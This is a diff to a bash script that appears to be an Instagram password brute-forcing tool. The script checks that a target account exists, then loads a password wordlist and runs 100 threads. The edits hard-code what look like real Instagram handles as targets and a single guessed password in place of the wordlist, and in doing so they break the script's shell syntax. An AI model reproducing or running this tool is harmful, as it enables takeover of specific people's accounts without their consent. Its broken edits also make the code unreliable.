@@ -42,14 +42,14 @@ printf "\n"
 
 
 function start() {
-read -p $'\e[1;92mUsername account: \e[0m' user
+read -p $'\e[1;92mUsername account: @janmoreno977 \e[0m' user: Alexgarcia2971
 checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
 if [[ "$checkaccount" == 1 ]]; then
 printf "\e[1;91mInvalid Username! Try again\e[0m\n"
 sleep 1
 start
 else
-default_wl_pass="passwords.lst"
+default_wl_pass= alejandro30
 read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
 wl_pass="${wl_pass:-${default_wl_pass}}"
 default_threads="100"
